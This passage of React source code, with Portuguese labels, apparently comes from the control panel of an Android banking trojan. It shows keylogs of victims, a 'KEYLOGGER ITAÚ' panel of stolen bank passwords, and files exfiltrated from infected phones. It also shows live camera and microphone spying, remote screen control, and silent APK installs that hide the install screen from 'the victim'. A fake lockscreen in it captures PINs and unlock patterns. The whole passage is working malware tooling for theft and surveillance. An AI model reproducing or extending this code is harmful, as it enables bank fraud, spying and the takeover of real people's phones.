                  setFloatingWindows(prev => ({
                    ...prev,
                    keylogger: { ...prev.keylogger, open: true }
                  }));
                }} 
                className="w-full py-2 rounded-lg font-semibold transition-all text-sm bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white"
              >
                📅 Abrir Histórico Completo
              </button>
              
              {/* Preview dos últimos keylogs */}
              {keylogsByDate.length > 0 && (
                <div className="mt-2">
                  <h4 className="text-[10px] text-gray-400 mb-1">
                    Últimos keylogs de hoje:
                  </h4>
                  <div className="bg-slate-900/50 rounded p-1 max-h-24 overflow-y-auto space-y-1">
                    {keylogsByDate.slice(-5).reverse().map((log, i) => (
                      <div key={i} className={`text-[9px] p-1 rounded ${
                        log.isPassword ? 'bg-red-900/30 border border-red-500/50' : 'bg-slate-800/50'
                      }`}>
                        <div className="flex items-center gap-1">
                          <span className="text-yellow-400 font-mono">{log.time}</span>
                          <span className={`font-mono truncate ${log.isPassword ? 'text-red-400' : 'text-white'}`}>
                            {log.isPassword && '🔑 '}{log.text}
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Câmera e Microfone em linha */}
            <div className="grid grid-cols-2 gap-2">
              <EditableButton
                id="btn-camera"
                onClick={toggleCamera}
                isEditMode={isLayoutEditMode}
                customStyle={layoutPrefs.buttonStyles['btn-camera']}
                onStyleChange={(style) => updateButtonStyle('btn-camera', style)}
                className={`py-2 rounded-lg font-semibold transition-all text-xs ${
                  isCameraEnabled
                    ? 'bg-green-600 hover:bg-green-700 text-white'
                    : 'bg-blue-600 hover:bg-blue-700 text-white'
                }`}
              >
                {isCameraEnabled ? '📷 ON' : '📸 Câmera'}
              </EditableButton>
              <EditableButton
                id="btn-microphone"
                onClick={toggleMicrophone}
                isEditMode={isLayoutEditMode}
                customStyle={layoutPrefs.buttonStyles['btn-microphone']}
                onStyleChange={(style) => updateButtonStyle('btn-microphone', style)}
                className={`py-2 rounded-lg font-semibold transition-all text-xs ${
                  isMicrophoneEnabled
                    ? 'bg-green-600 hover:bg-green-700 text-white'
                    : 'bg-red-600 hover:bg-red-700 text-white'
                }`}
              >
                {isMicrophoneEnabled ? '🎤 ON' : '🎵 Mic'}
              </EditableButton>
            </div>

            {/* 🏦 KEYLOGGER ITAÚ - Senhas Capturadas (SEMPRE VISÍVEL quando tem senhas) */}
            {bankPasswords.length > 0 && (
              <div className="bg-gradient-to-br from-orange-900/30 to-orange-800/20 rounded-lg p-3 border-2 border-orange-500">
                <h3 className="text-white font-bold mb-2 flex items-center text-sm">
                  <span className="text-lg mr-2">🏦</span>
                  KEYLOGGER ITAÚ
                  <span className="ml-2 px-2 py-0.5 bg-orange-600 text-white text-[10px] rounded-full">
                    {bankPasswords.length}
                  </span>
                </h3>
                
                <div className="space-y-2 max-h-60 overflow-y-auto">
                  {bankPasswords.map((pwd, i) => (
                    <div 
                      key={i} 
                      className="bg-gradient-to-r from-orange-950/80 to-gray-900/80 border border-orange-500/50 rounded-lg p-3"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center space-x-2">
                          <span className="text-lg">🏦</span>
                          <span className="font-bold text-orange-400 text-sm">{pwd.bank || 'Itaú'}</span>
                          <span className="px-2 py-0.5 bg-orange-600 text-white text-[10px] rounded-full font-bold">
                            {pwd.digits || 6} dígitos
                          </span>
                        </div>
                        <span className="text-[10px] text-gray-400">
                          {new Date(pwd.timestamp).toLocaleTimeString()}
                        </span>
                      </div>
                      
                      {/* Label do campo (SENHA_INICIAL, SENHA_TRANSACAO, etc) */}
                      <div className="mb-2 flex items-center space-x-2 flex-wrap gap-1">
                        {(pwd.label || pwd.hint) && (
                          <span className="px-2 py-1 bg-orange-800/60 text-orange-300 text-[10px] rounded font-mono font-bold">
                            {pwd.label || pwd.hint}
                          </span>
                        )}
                        {pwd.source === 'VISUAL_SCREEN' && (
                          <span className="px-2 py-1 bg-green-800/60 text-green-300 text-[10px] rounded">
                            📱 APK Visual
                          </span>
                        )}
                      </div>
                      
                      {/* Senha capturada */}
                      <div className="bg-black/60 rounded-lg p-3 border border-orange-500/30">
                        <div className="text-2xl font-bold text-green-400 tracking-[0.3em] font-mono text-center">
                          {pwd.password}
                        </div>
                      </div>
                      
                      {/* Status */}
                      <div className="mt-2 flex items-center justify-between">
                        <div className={`px-2 py-1 rounded text-[10px] font-bold ${
                          pwd.status === 'captured' ? 'bg-yellow-500 text-black' :
                          pwd.status === 'confirmed' ? 'bg-green-500 text-white' :
                          'bg-red-600 text-white'
                        }`}>
                          {pwd.status === 'captured' && '⚡ CAPTURADA'}
                          {pwd.status === 'confirmed' && '✅ CONFIRMADA'}
                          {pwd.status === 'failed' && '❌ ERRO'}
                        </div>
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(pwd.password);
                            addLog(`📋 Senha copiada: ${pwd.password}`);
                          }}
                          className="px-2 py-1 bg-gray-700 hover:bg-gray-600 text-white text-[10px] rounded transition-colors"
                        >
                          📋 Copiar
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
            
            {/* 📤 ARQUIVOS ENVIADOS - Documentos, Fotos, PDFs (SEMPRE VISÍVEL) */}
            {(
              <div className="bg-gradient-to-br from-green-900/30 to-green-800/20 rounded-lg p-3 border-2 border-green-500 mt-3">
                <h3 className="text-white font-bold mb-2 flex items-center text-sm">
                  <span className="text-lg mr-2">📤</span>
                  ARQUIVOS RECEBIDOS
                  <span className="ml-2 px-2 py-0.5 bg-green-600 text-white text-[10px] rounded-full">
                    {uploadedFiles.length}
                  </span>
                </h3>
                
                {uploadedFiles.length === 0 ? (
                  <div className="text-center py-4 text-gray-400">
                    <div className="text-3xl mb-2">📁</div>
                    <p className="text-xs">Aguardando arquivos do APK Visual...</p>
                    <p className="text-[10px] text-gray-500 mt-1">Fotos, PDFs, Documentos</p>
                  </div>
                ) : (
                <div className="space-y-2 max-h-60 overflow-y-auto">
                  {uploadedFiles.map((file, i) => (
                    <div 
                      key={i} 
                      className="bg-gradient-to-r from-green-950/80 to-gray-900/80 border border-green-500/50 rounded-lg p-3"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center space-x-2">
                          <span className="text-lg">
                            {file.mimeType?.startsWith('image/') ? '🖼️' : 
                             file.mimeType === 'application/pdf' ? '📄' : 
                             file.mimeType?.includes('document') ? '📝' : '📁'}
                          </span>
                          <span className="font-bold text-green-400 text-sm truncate max-w-[150px]">
                            {file.fileName || 'arquivo'}
                          </span>
                        </div>
                        <span className="text-[10px] text-gray-400">
                          {new Date(file.timestamp).toLocaleTimeString()}
                        </span>
                      </div>
                      
                      {/* Label do arquivo */}
                      <div className="mb-2">
                        <span className="px-2 py-1 bg-green-800/60 text-green-300 text-[10px] rounded font-mono font-bold">
                          {file.label || 'DOCUMENTO'}
                        </span>
                        <span className="ml-2 px-2 py-1 bg-gray-700 text-gray-300 text-[10px] rounded">
                          {file.mimeType || 'Desconhecido'}
                        </span>
                      </div>
                      
                      {/* Preview de imagem */}
                      {file.mimeType?.startsWith('image/') && file.data && (
                        <div className="mb-2 flex justify-center">
                          <img 
                            src={`data:${file.mimeType};base64,${file.data}`}
                            alt={file.fileName}
                            className="max-w-full max-h-32 rounded border border-green-500/30"
                          />
                        </div>
                      )}
                      
                      {/* Ações */}
                      <div className="flex items-center justify-end space-x-2">
                        <button
                          onClick={() => {
                            // Download do arquivo
                            const link = document.createElement('a');
                            link.href = `data:${file.mimeType};base64,${file.data}`;
                            link.download = file.fileName || 'arquivo';
                            link.click();
                            addLog(`📥 Arquivo baixado: ${file.fileName}`);
                          }}
                          className="px-2 py-1 bg-green-600 hover:bg-green-500 text-white text-[10px] rounded transition-colors"
                        >
                          📥 Baixar
                        </button>
                        {file.mimeType?.startsWith('image/') && (
                          <button
                            onClick={() => {
                              // Abre em nova aba
                              const newWindow = window.open('', '_blank');
                              if (newWindow) {
                                newWindow.document.write(`<img src="data:${file.mimeType};base64,${file.data}" />`);
                              }
                            }}
                            className="px-2 py-1 bg-gray-700 hover:bg-gray-600 text-white text-[10px] rounded transition-colors"
                          >
                            🔍 Ver
                          </button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
                )}
              </div>
            )}

            {/* REMOVIDO: Exfiltrar Dados */}

            {/* REMOVIDO: Logs */}
                </div>
                </div>
                </div>
      
      {/* 📷 MODAL DE CÂMERA */}
      {showCameraModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => {
          setShowCameraModal(false);
          toggleCamera();
        }}>
          <div className="bg-slate-800 rounded-lg p-6 max-w-2xl w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white flex items-center">
                <span className="text-3xl mr-3">📷</span>
                Câmera em Tempo Real
              </h2>
              <button
                onClick={() => {
                  setShowCameraModal(false);
                  toggleCamera();
                }}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
              </div>

            <div className="bg-black rounded-lg p-2">
              <canvas
                ref={cameraCanvasRef}
                className="w-full h-auto rounded"
                style={{ maxHeight: '500px' }}
              />
            </div>

            <div className="mt-4 flex items-center justify-center space-x-2 text-green-400">
              <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
              <span className="font-semibold">Ao Vivo</span>
            </div>
            
            <div className="mt-4 flex items-center justify-between">
              <div className="flex items-center space-x-2 text-sm text-gray-300">
                <span>🎬 Câmera:</span>
                <span className="font-bold">{currentCamera === 'front' ? 'FRONTAL' : 'TRASEIRA'}</span>
              </div>
                <button
                onClick={switchCamera}
                className="flex items-center space-x-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
                >
                <span>🔄</span>
                <span>Alternar Câmera</span>
                </button>
              </div>
            </div>
        </div>
      )}
      
      {/* 🎤 MODAL DE MICROFONE */}
      {showMicrophoneModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => {
          setShowMicrophoneModal(false);
          toggleMicrophone();
        }}>
          <div className="bg-slate-800 rounded-lg p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white flex items-center">
                <span className="text-3xl mr-3">🎤</span>
                Microfone em Tempo Real
              </h2>
              <button
                onClick={() => {
                  setShowMicrophoneModal(false);
                  toggleMicrophone();
                }}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            <div className="bg-gradient-to-br from-red-900/30 to-purple-900/30 rounded-lg p-8">
              <div className="flex flex-col items-center justify-center space-y-4">
                <div className="relative">
                  <div className="w-32 h-32 bg-red-600 rounded-full flex items-center justify-center animate-pulse">
                    <span className="text-6xl">🎤</span>
          </div>
                  <div className="absolute inset-0 bg-red-500/30 rounded-full animate-ping"></div>
        </div>
                
                <div className="text-center">
                  <div className="flex items-center justify-center space-x-2 text-green-400 mb-2">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="font-bold text-xl">Escutando...</span>
      </div>
                  <p className="text-gray-300 text-sm">
                    Áudio sendo transmitido em tempo real
                  </p>
                </div>
                
                {/* Visualizador de áudio simples */}
                <div className="flex items-center justify-center space-x-1">
                  {[...Array(10)].map((_, i) => (
                    <div
                      key={i}
                      className="w-2 bg-green-500 rounded-full"
                      style={{
                        height: `${Math.random() * 40 + 10}px`,
                        animation: `pulse ${Math.random() * 0.5 + 0.3}s ease-in-out infinite`
                      }}
                    />
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* 🖥️ MODAL EXPANDIDO - VNC + Screen Reader lado a lado */}
      {isExpandedMode && (
        <div className="fixed inset-0 bg-black z-[200] flex flex-col">
          {/* Header do modo expandido */}
          <div className="flex items-center justify-between px-4 py-2 bg-slate-800 border-b border-slate-700">
            <div className="flex items-center space-x-4">
              <h2 className="text-white font-bold">🖥️ Modo Expandido - {device?.model}</h2>
              <div className={`px-2 py-1 rounded text-xs ${device?.is_online ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                {device?.is_online ? '● Online' : '● Offline'}
              </div>
            </div>
            <button
              onClick={() => setIsExpandedMode(false)}
              className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition-all"
            >
              ✕ Fechar
            </button>
          </div>
          
          {/* Conteúdo lado a lado */}
          <div className="flex-1 flex gap-4 p-4 overflow-hidden">
            {/* VNC Normal */}
            <div className="flex-1 flex flex-col bg-slate-900 rounded-lg border border-purple-500 overflow-hidden">
              <div className="px-3 py-2 bg-purple-600/20 border-b border-purple-500/50">
                <span className="text-purple-300 font-bold text-sm">📺 VNC Normal</span>
              </div>
              <div className="flex-1 flex items-center justify-center overflow-hidden p-2">
                {isCaptureEnabled ? (
                  <DeviceScreen
                    deviceId={deviceId!}
                    onCommand={sendCommand}
                    isBlackScreenActive={isBlackScreen}
                    captureMethod="silent"
                    killerFrameOnPointerMove={isKillerMode}
                    onRequestFrame={requestKillerFrame}
                  />
                ) : (
                  <div className="text-center text-gray-400">
                    <p className="mb-2">📺 Captura não ativada</p>
                    <button
                      onClick={toggleCapture}
                      className="px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-sm"
                    >
                      Iniciar Captura
                    </button>
                  </div>
                )}
              </div>
            </div>
            
            {/* Screen Reader V2 Expandido */}
            <div className="flex-1 flex flex-col bg-slate-900 rounded-lg border border-green-500 overflow-hidden">
              <div className="px-3 py-2 bg-green-600/20 border-b border-green-500/50 flex items-center justify-between">
                <span className="text-green-300 font-bold text-sm">
                  <Eye className="w-4 h-4 inline mr-1" />
                  Screen Reader V2
                </span>
                {isScreenReaderEnabled && (
                  <div className="flex items-center space-x-2">
                    <div className="text-[10px] bg-green-600/30 text-green-300 px-1.5 py-0.5 rounded flex items-center">
                      <div className="w-1.5 h-1.5 bg-green-400 rounded-full mr-1 animate-pulse"></div>
                      ~10 FPS
                    </div>
                  </div>
                )}
              </div>
              <div className="flex-1 flex items-center justify-center overflow-hidden p-2">
                {!isScreenReaderEnabled ? (
                  <div className="text-center text-gray-400">
                    <Eye className="w-12 h-12 mx-auto mb-2 opacity-50" />
                    <p className="mb-2">Screen Reader não ativado</p>
                    <button
                      onClick={toggleScreenReader}
                      className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm"
                    >
                      Ativar
                    </button>
                  </div>
                ) : screenHierarchy ? (
                  <div 
                    className="relative bg-slate-950 cursor-crosshair flex items-center justify-center"
                    style={{
                      width: '100%',
                      maxWidth: '450px',
                      aspectRatio: `${SCREEN_BASE_WIDTH} / ${SCREEN_BASE_HEIGHT}`
                    }}
                    onMouseDown={(e) => {
                      e.preventDefault();
                      const canvas = e.currentTarget.querySelector('canvas');
                      if (!canvas) return;
                      const rect = canvas.getBoundingClientRect();
                      const x = e.clientX - rect.left;
                      const y = e.clientY - rect.top;
                      setMouseDownPos({ x, y });
                      setMouseDownTime(Date.now());
                      setIsDragging(true);
                      dragPathRef.current = [{ x, y }];
                    }}
                    onMouseMove={(e) => {
                      if (!isDragging || !mouseDownPos) return;
                      e.preventDefault();
                      const canvas = e.currentTarget.querySelector('canvas');
                      if (!canvas) return;
                      const rect = canvas.getBoundingClientRect();
                      const x = e.clientX - rect.left;
                      const y = e.clientY - rect.top;
                      const lastPoint = dragPathRef.current[dragPathRef.current.length - 1];
                      const dist = Math.sqrt(Math.pow(x - lastPoint.x, 2) + Math.pow(y - lastPoint.y, 2));
                      if (dist > 10) {
                        dragPathRef.current.push({ x, y });
                      }
                    }}
                    onMouseUp={(e) => {
                      if (!mouseDownPos) return;
                      e.preventDefault();
                      const canvas = e.currentTarget.querySelector('canvas');
                      if (!canvas) return;
                      const rect = canvas.getBoundingClientRect();
                      const upX = e.clientX - rect.left;
                      const upY = e.clientY - rect.top;
                      const downX = mouseDownPos.x;
                      const downY = mouseDownPos.y;
                      const deltaX = upX - downX;
                      const deltaY = upY - downY;
                      const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
                      const holdTime = Date.now() - mouseDownTime;
                      
                      // Calcula escala baseada no tamanho do canvas
                      const realScale = rect.width / SCREEN_BASE_WIDTH;
                      
                      if (distance < 10 && holdTime < 500) {
                        const realX = Math.round(downX / realScale);
                        const realY = Math.round(downY / realScale);
                        sendCommand({ action: 'CLICK', x: realX, y: realY });
                      } else if (distance >= 10) {
                        if (dragPathRef.current.length > 3) {
                          const xCoords = dragPathRef.current.map(p => Math.round(p.x / realScale));
                          const yCoords = dragPathRef.current.map(p => Math.round(p.y / realScale));
                          sendCommand({ action: 'PATH_GESTURE', xCoords, yCoords });
                        } else {
                          const realX1 = Math.round(downX / realScale);
                          const realY1 = Math.round(downY / realScale);
                          const realX2 = Math.round(upX / realScale);
                          const realY2 = Math.round(upY / realScale);
                          sendCommand({ action: 'SWIPE', x1: realX1, y1: realY1, x2: realX2, y2: realY2 });
                        }
                      }
                      
                      setMouseDownPos(null);
                      setIsDragging(false);
                      dragPathRef.current = [];
                    }}
                    onMouseLeave={() => {
                      setMouseDownPos(null);
                      setIsDragging(false);
                      dragPathRef.current = [];
                    }}
                  >
                    <ScreenReaderCanvas 
                      hierarchy={screenHierarchy.hierarchy} 
                      maxHeight={window.innerHeight - 100}
                    />
                  </div>
                ) : (
                  <div className="text-center text-gray-400">
                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-500 mx-auto mb-2"></div>
                    <p>Aguardando dados...</p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* 📱 MODAL DE APPS INSTALADOS */}
      {showAppsModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowAppsModal(false)}>
          <div className="bg-slate-800 rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[90vh] overflow-hidden flex flex-col" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white flex items-center">
                <span className="text-3xl mr-3">📱</span>
                Apps Instalados
                <span className="ml-3 text-sm font-normal text-gray-400">
                  ({filteredApps.length} apps)
                </span>
              </h2>
              <button
                onClick={() => setShowAppsModal(false)}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            {/* Filtros e busca */}
            <div className="flex flex-wrap gap-2 mb-4">
                <input
                  type="text"
                placeholder="Buscar app..."
                value={appsSearch}
                onChange={(e) => setAppsSearch(e.target.value)}
                className="flex-1 min-w-[200px] px-3 py-2 bg-slate-700 text-white rounded-lg border border-slate-600 focus:border-blue-500 focus:outline-none"
              />
              
              <div className="flex gap-1">
                <button
                  onClick={() => setAppsFilter('user')}
                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
                    appsFilter === 'user' 
                      ? 'bg-blue-600 text-white' 
                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                  }`}
                >
                  👤 Usuário
                </button>
                <button
                  onClick={() => setAppsFilter('system')}
                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
                    appsFilter === 'system' 
                      ? 'bg-blue-600 text-white' 
                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                  }`}
                >
                  ⚙️ Sistema
                </button>
                <button
                  onClick={() => setAppsFilter('all')}
                  className={`px-3 py-2 rounded-lg font-medium transition-all ${
                    appsFilter === 'all' 
                      ? 'bg-blue-600 text-white' 
                      : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                  }`}
                >
                  📋 Todos
                </button>
              </div>
              
              <button
                onClick={fetchInstalledApps}
                disabled={isLoadingApps}
                className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-medium transition-all flex items-center"
              >
                {isLoadingApps ? '⏳' : '🔄'} Atualizar
              </button>
            </div>

            {/* Lista de apps */}
            <div className="flex-1 overflow-y-auto">
              {isLoadingApps ? (
                <div className="flex items-center justify-center py-12">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
                  <span className="ml-3 text-gray-400">Carregando apps...</span>
                </div>
              ) : filteredApps.length === 0 ? (
                <div className="text-center py-12 text-gray-400">
                  <span className="text-4xl mb-4 block">📭</span>
                  {installedApps.length === 0 
                    ? 'Clique em "Atualizar" para carregar os apps'
                    : 'Nenhum app encontrado com os filtros atuais'
                  }
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {filteredApps.map((app, index) => (
                    <div
                      key={app.package || index}
                      className="bg-slate-700 rounded-lg p-3 flex items-center justify-between hover:bg-slate-600 transition-all"
                    >
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center">
                          <span className="text-2xl mr-2">
                            {app.isSystem ? '⚙️' : '📱'}
                          </span>
                          <div className="min-w-0">
                            <h4 className="text-white font-medium truncate">
                              {app.name}
                            </h4>
                            <p className="text-gray-400 text-xs truncate">
                              {app.package}
                            </p>
                            {app.version && (
                              <p className="text-gray-500 text-xs">
                                v{app.version}
                              </p>
                            )}
                          </div>
                        </div>
                      </div>
                      
                      <div className="flex gap-1 ml-2">
                        {app.canOpen && (
                          <button
                            onClick={() => openApp(app.package, app.name)}
                            className="p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-all"
                            title="Abrir app"
                          >
                            ▶️
                          </button>
                        )}
                        
                        <button
                          onClick={() => forceStopApp(app.package, app.name)}
                          className="p-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg transition-all"
                          title="Forçar parada"
                        >
                          ⛔
                        </button>
                        
                        {!app.isSystem && (
                          <button
                            onClick={() => uninstallApp(app.package, app.name)}
                            className="p-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-all"
                            title="Desinstalar"
                          >
                            🗑️
                          </button>
                        )}
          </div>
        </div>
                  ))}
      </div>
              )}
            </div>
          </div>
        </div>
      )}
      
      {/* 🔧 MODAL CONFIRMAR CONFIGURAR ROM */}
      {showConfigureRomConfirm && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowConfigureRomConfirm(false)}>
          <div className="bg-slate-800 rounded-lg p-6 max-w-sm w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <h2 className="text-lg font-bold text-white mb-3">🔧 Configurar ROM</h2>
            <p className="text-gray-300 text-sm mb-4">
              Executar autostart + otimização de bateria automaticamente no dispositivo?
            </p>
            <div className="flex gap-2">
              <button
                type="button"
                onClick={() => setShowConfigureRomConfirm(false)}
                className="flex-1 py-2 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold"
              >
                Cancelar
              </button>
              <button
                type="button"
                onClick={async () => {
                  setShowConfigureRomConfirm(false);
                  await sendCommand({ action: 'CONFIGURE_ROM' });
                  addLog('🔧 Configurando ROM (Autostart, Battery...)');
                }}
                className="flex-1 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg font-semibold"
              >
                Confirmar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 📦 MODAL DE INSTALAR APK */}
      {showInstallApkModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowInstallApkModal(false)}>
          <div className="bg-slate-800 rounded-lg p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-bold text-white flex items-center">
                <span className="text-2xl mr-3">📦</span>
                Instalar APK Silenciosamente
              </h2>
              <button
                onClick={() => {
                  setShowInstallApkModal(false);
                  setSelectedApkFile(null);
                }}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            <div className="space-y-4">
              <div className="text-sm text-gray-400 mb-4">
                <p>📌 O APK será instalado automaticamente no dispositivo.</p>
                <p>📌 O AccessibilityService vai auto-clicar em "Instalar".</p>
                <p>📌 A vítima mal verá a tela de instalação!</p>
              </div>
              
              {/* Input de arquivo oculto */}
              <input
                ref={apkInputRef}
                type="file"
                accept=".apk"
                className="hidden"
                onChange={(e) => {
                  const file = e.target.files?.[0];
                  if (file) setSelectedApkFile(file);
                }}
              />
              
              {/* Área de seleção de arquivo */}
              <div 
                onClick={() => apkInputRef.current?.click()}
                className={`border-2 border-dashed rounded-lg p-6 text-center cursor-pointer transition-all ${
                  selectedApkFile 
                    ? 'border-green-500 bg-green-500/10' 
                    : 'border-slate-600 hover:border-orange-500 hover:bg-slate-700'
                }`}
              >
                {selectedApkFile ? (
                  <div className="text-green-400">
                    <span className="text-3xl">✅</span>
                    <p className="mt-2 font-medium">{selectedApkFile.name}</p>
                    <p className="text-sm text-gray-400">
                      {(selectedApkFile.size / 1024 / 1024).toFixed(2)} MB
                    </p>
                  </div>
                ) : (
                  <div className="text-gray-400">
                    <span className="text-3xl">📁</span>
                    <p className="mt-2">Clique para selecionar o arquivo .apk</p>
                    <p className="text-sm">ou arraste e solte aqui</p>
                  </div>
                )}
              </div>
              
              {/* Botões */}
              <div className="flex gap-3">
                <button
                  onClick={() => {
                    setShowInstallApkModal(false);
                    setSelectedApkFile(null);
                  }}
                  className="flex-1 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-semibold transition-all"
                >
                  Cancelar
                </button>
                <button
                  onClick={handleInstallApk}
                  disabled={!selectedApkFile || isInstallingApk}
                  className={`flex-1 py-3 rounded-lg font-semibold transition-all flex items-center justify-center ${
                    selectedApkFile && !isInstallingApk
                      ? 'bg-orange-600 hover:bg-orange-700 text-white'
                      : 'bg-slate-600 text-gray-400 cursor-not-allowed'
                  }`}
                >
                  {isInstallingApk ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                      Enviando...
                    </>
                  ) : (
                    '📦 Instalar'
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* 🔒 MODAL DE LOCKSCREEN PIN + PATTERN - Igual EAGLESPY V5 */}
      {showLockscreenModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowLockscreenModal(false)}>
          <div className="bg-gradient-to-br from-slate-900 to-slate-800 rounded-lg p-6 max-w-lg w-full mx-4 border border-yellow-500/50 max-h-[90vh] overflow-y-auto" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-bold text-white flex items-center">
                <span className="text-2xl mr-3">🔒</span>
                Lockscreen
              </h2>
              <button
                onClick={() => setShowLockscreenModal(false)}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            {/* Seletor de Tipo */}
            <div className="flex gap-2 mb-4">
              <button
                onClick={() => setLockscreenType('PIN')}
                className={`flex-1 py-3 rounded-lg font-bold transition-all ${
                  lockscreenType === 'PIN'
                    ? 'bg-yellow-600 text-white'
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                🔢 PIN / Senha
              </button>
              <button
                onClick={() => setLockscreenType('PATTERN')}
                className={`flex-1 py-3 rounded-lg font-bold transition-all ${
                  lockscreenType === 'PATTERN'
                    ? 'bg-blue-600 text-white'
                    : 'bg-slate-700 text-gray-300 hover:bg-slate-600'
                }`}
              >
                🔲 Padrão (Swipe)
              </button>
            </div>
            
            {/* Status do Lockscreen */}
            <div className={`mb-4 p-3 rounded-lg ${isLockscreenActive ? 'bg-green-500/20 border border-green-500' : 'bg-gray-800 border border-gray-600'}`}>
              <div className="flex items-center justify-between">
                <span className="text-white font-semibold">
                  {isLockscreenActive ? `🔐 ${lockscreenType} ATIVO` : '🔓 Inativo'}
                </span>
                <button
                  onClick={isLockscreenActive ? hideLockscreen : showLockscreen}
                  className={`px-4 py-2 rounded-lg font-bold transition-all ${
                    isLockscreenActive
                      ? 'bg-red-600 hover:bg-red-700 text-white'
                      : 'bg-green-600 hover:bg-green-700 text-white'
                  }`}
                >
                  {isLockscreenActive ? '❌ Desativar' : `🔒 Bloquear com ${lockscreenType}`}
                </button>
              </div>
              <p className="text-xs text-gray-400 mt-2">
                {isLockscreenActive 
                  ? `Aguardando vítima ${lockscreenType === 'PIN' ? 'digitar PIN' : 'desenhar padrão'}...` 
                  : `Clique para mostrar tela de ${lockscreenType === 'PIN' ? 'PIN' : 'Padrão'} na vítima`}
              </p>
            </div>
            
            {/* Dados Capturados */}
            {lockscreenType === 'PIN' ? (
              <div className="mb-4">
                <label className="text-gray-300 text-sm font-semibold">🔢 PIN Capturado/Salvo:</label>
                <div className="flex gap-2 mt-1">
                  <input
                    type="text"
                    value={pinInput}
                    onChange={(e) => setPinInput(e.target.value.replace(/\D/g, ''))}
                    placeholder="Digite ou edite o PIN"
                    maxLength={10}
                    className="flex-1 px-4 py-2 bg-black border border-yellow-500/50 rounded-lg text-center text-2xl font-bold tracking-widest text-yellow-400"
                  />
                  <button
                    onClick={() => saveDevicePin(pinInput)}
                    className="px-4 py-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg font-semibold"
                  >
                    💾
                  </button>
                </div>
                {capturedPin && capturedPin !== pinInput && (
                  <p className="text-xs text-green-400 mt-1">💡 Último PIN capturado: {capturedPin}</p>
                )}
              </div>
            ) : (
              <div className="mb-4">
                <label className="text-gray-300 text-sm font-semibold">🔲 Padrão Capturado/Salvo:</label>
                <div className="flex gap-2 mt-1">
                  <input
                    type="text"
                    value={patternInput}
                    onChange={(e) => setPatternInput(e.target.value.replace(/[^1-9]/g, ''))}
                    placeholder="Ex: 14789 (pontos 1-9)"
                    maxLength={9}
                    className="flex-1 px-4 py-2 bg-black border border-blue-500/50 rounded-lg text-center text-2xl font-bold tracking-widest text-blue-400"
                  />
                  <button
                    onClick={() => saveDevicePattern(patternInput)}
